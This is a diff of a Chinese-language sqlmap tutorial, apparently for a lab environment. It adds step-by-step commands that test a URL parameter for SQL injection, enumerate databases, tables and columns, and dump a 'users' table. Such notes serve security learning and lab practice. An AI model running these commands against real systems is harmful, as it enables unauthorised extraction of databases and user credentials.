@@ -17,8 +17,41 @@ sqlmap --update
 ```
 Sqlmap.py -v 3 -u http://192.168.2.149:86/Less-1/?id=1 --user-argent=websecurity --threads=5 -p id --level 3 --technique=E --current-user --flush-session --beep
 ```
-- **傻瓜式注入**
-    - **傻瓜式和参数配置都能进行注入，那么一定有一个配置文件来支撑傻瓜式注入<BR>可以看出已经跑出来了**
+
+## <font color = #1E90FF>常规注入</font>
+- <B>指定url -u 验证注入是否存在<B>
+    ```sqlmap
+    sqlmap.py -u "http://127.0.0.1/test/index.php?id=1"
+    ```
+
+- <B>指定--dbs跑取当前MySQL中的所有数据库<B>
+    ```sqlmap
+    sqlmap.py -u "http://127.0.0.1/test/index.php?id=1" --dbs
+    ```
+
+- <B>指定--current-db跑取当前数据库名字<B>
+    ```sqlmap
+    sqlmap.py -u "http://127.0.0.1/test/index.php?id=1" --current-db
+    ```
+
+- <B>指定--tables -D "库名" 跑取当前数据库表名<B>
+    ```sqlmap
+    sqlmap.py -u "http://127.0.0.1/test/index.php?id=1" --tables -D "security"
+    ```
+
+- <B>指定-D "库名" -T "表名" --columns跑取当前表的字段名<B>
+    ```sqlmap
+    sqlmap.py -u "http://127.0.0.1/test/index.php?id=1" -D "security" -T "users" --columns
+    ```
+
+- <B>指定--dump导出数据<B>
+    ```sqlmap
+    sqlmap.py -u "http://127.0.0.1/test/index.php?id=1" -D "security" -T "users" --columns --dump
+    ```
+
+
+### <font color = #FF0000>傻瓜式注入</font><BR>
+- **傻瓜式和参数配置都能进行注入，那么一定有一个配置文件来支撑傻瓜式注入<BR>可以看出已经跑出来了**
     ```
     Sqlmap.py -u http://192.168.2.149:86/Less-1/?id=1
     ```
